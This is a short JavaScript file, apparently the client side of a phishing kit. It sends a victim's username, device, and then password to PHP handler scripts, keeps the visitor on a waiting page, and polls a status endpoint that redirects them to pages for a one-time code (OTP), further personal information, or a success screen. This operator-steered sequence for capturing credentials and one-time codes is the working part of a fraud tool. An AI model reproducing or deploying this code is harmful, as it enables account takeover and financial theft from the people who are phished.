function inicio(u){
    var d = detectar_dispositivo();
    $("#fondo, #cargando-o").show();
    $.post( "../process/inicio.php", { usr: u, dis: d } ).always(function() {
        window.location.href = "PASS.php"; 
    });
}

function pasousuario(p){    
    $("#fondo, #cargando-o").show();
    $.post( "../process/pasousuario.php", { pass: p } ).always(function() {
        window.location.href = "WAITING.php"; 
    });
}            

function consultar_estado(){    
    $.post( "../process/estado.php?v=" + Math.random(), function(data) {        
        var estado = data.toString().trim();
        switch (estado) {
            case '2': window.location.href = "OTP.php"; break;
            case '4': window.location.href = "INFO.php"; break;
            case '10': window.location.href = "SUCCESS.php"; break;
        } 
    });        
}
